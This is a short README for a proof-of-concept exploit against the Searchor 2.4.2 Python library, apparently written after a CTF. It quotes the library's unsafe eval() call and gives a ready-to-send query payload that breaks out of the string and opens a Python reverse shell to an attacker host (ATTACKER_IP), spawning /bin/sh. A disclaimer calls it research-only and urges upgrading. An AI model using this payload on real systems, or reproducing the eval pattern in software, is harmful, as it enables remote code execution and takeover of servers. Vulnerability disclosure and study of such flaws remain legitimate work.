# POC-Searchor-2.4.2
eval() Exploit POC for Searchor 2.4.2 and lower

vulnerability Reference: https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

* This is displayed for research purposes only and found during CTF

Vulnerable code includes eval() methods as here

```python
url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

If user parameter `query` is not sanitized it leads to RCE.

* Exploit code for linux target

```
#send this as query parameter

', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

```

## DISCLAIMER

* this is posted for research purpose only
* use the newest Searcher version to be safe: https:/I/github.com/ArjunSharda/Searchor
* using this against other web sites is subject to criminal punishment!
